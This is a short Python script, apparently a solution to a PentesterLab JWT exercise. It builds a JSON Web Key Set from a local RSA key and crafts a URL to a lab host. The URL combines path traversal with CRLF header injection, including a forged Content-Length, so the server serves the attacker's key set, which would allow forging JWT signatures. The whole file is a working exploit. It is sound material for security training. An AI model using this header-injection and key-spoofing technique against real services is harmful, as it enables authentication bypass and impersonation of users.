from OpenSSL.crypto import FILETYPE_PEM, load_privatekey
import base64
import json,urllib

#Loading Private key from file.
#Command: openssl genrsa -out private.pem 2048
with open('private_key.pem', 'rb') as f:
    private_key_data = f.read()
    private_key = load_privatekey(FILETYPE_PEM, private_key_data)
    private_key= private_key.to_cryptography_key()
    pub=private_key.public_key()

#Generating Public key
e=pub.public_numbers().e
n=pub.public_numbers().n

# Printing e,n
e=base64.urlsafe_b64encode((e).to_bytes((e).bit_length()//8+1,byteorder="big")).decode('utf8').rstrip("=")
n=base64.urlsafe_b64encode((n).to_bytes((n).bit_length()//8+1,byteorder="big")).decode('utf8').rstrip("=")

content={
            "keys": [
                {
                "kty": "RSA",
                "use": "sig",
                "kid": "pentesterlab",
                "alg": "RS256"
                }
            ]
        }

content["keys"][0]["n"]=n
content["keys"][0]["e"]=e

jwk=json.dumps(content)
length=len(jwk)

URL="http://ptl-b77a8d98-ad25e3bd.libcurl.so/.well-known/../debug?value=1337%0d%0aContent-Length:+"+str(length)+"%0d%0a%0d%0a"+urllib.parse.quote(jwk)
print(URL)